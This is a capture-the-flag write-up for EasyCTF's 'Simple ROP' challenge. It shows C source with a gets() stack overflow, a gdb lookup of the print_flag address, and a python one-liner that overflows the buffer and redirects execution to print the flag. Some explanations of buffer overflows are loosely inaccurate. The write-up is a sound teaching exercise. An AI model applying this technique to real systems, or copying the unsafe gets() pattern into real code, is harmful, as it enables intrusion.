Simple ROP
======
* **120 points**
* **Category: Binary Exploitation**
* **Problem statement:** _Read flag.txt_
* [Source](Source.C) , [Binary](simple-rop)

Lets start by looking at the Source!
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void print_flag();
void what_did_you_say();

int main(int argc, char* argv[])
{
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    what_did_you_say();
    return 0;
}

void print_flag()
{
    system("cat flag.txt");
}

void what_did_you_say()
{
    char buff[64];
    gets(buff);
    printf("You said: %s\n", buff);
}

```

So we input characters and those get stored in an array, and then printed out for us to see. But what happens if we enter more characters than the array can store?
 Well in C, it interprets those bytes that can't get stored in the array as where the next instruction to be executed is.
  (This is known as a buffer overflow, We are filling up the buffer, and the overflow is the next instruction to be executed.)

So lets get the location of where the function "print_flag()" is in the binary.
To do this, we open the binary in gdb.
```
$ gdb ./simple-rop
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later
<snip>
Reading symbols from ./simple-rop...(no debugging symbols found)...done.

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048330  _init
0x08048370  printf@plt
0x08048380  gets@plt
0x08048390  getegid@plt
0x080483a0  system@plt
0x080483b0  __libc_start_main@plt
0x080483c0  setresgid@plt
0x080483e0  _start
0x08048410  __x86.get_pc_thunk.bx
0x08048420  deregister_tm_clones
0x08048450  register_tm_clones
0x08048490  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484db  main
0x0804851a  print_flag
0x08048533  what_did_you_say
0x08048560  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c4  _fini
(gdb)

```
Our address is `0x0804851a  print_flag`!
So now we just need to call the binary, fill the char array, and then specify 0x0804851a be executed.
In C, these memory addresses are stored in Little Endian Form, so that means that the number to be entered will have the order of the bytes reversed.

So the number to inject at the end is `0x1a850408`
So now we use python to try to execute the attack. We want to feed the simple-rop file 64 chars of input and then that hex value. We can use python to do this, because some of those characters in the memory address are unprintable.

```
$ python -c "print('A' * 64 + '\x1a\x85\x04\x08')" | ./simple-rop
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
```
Huh not even a Seg Fault? That typically means the buffer didn't actually overflow. Well actually sometimes char[64] can actually be a few more bytes, in this case 76 bytes. Doing that we get:
```
$ python -c "print('A' * 76 + '\x1a\x85\x04\x08')" | ./simple-rop
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
easyctf{r0p_7o_v1ct0ry}
Segmentation fault
```
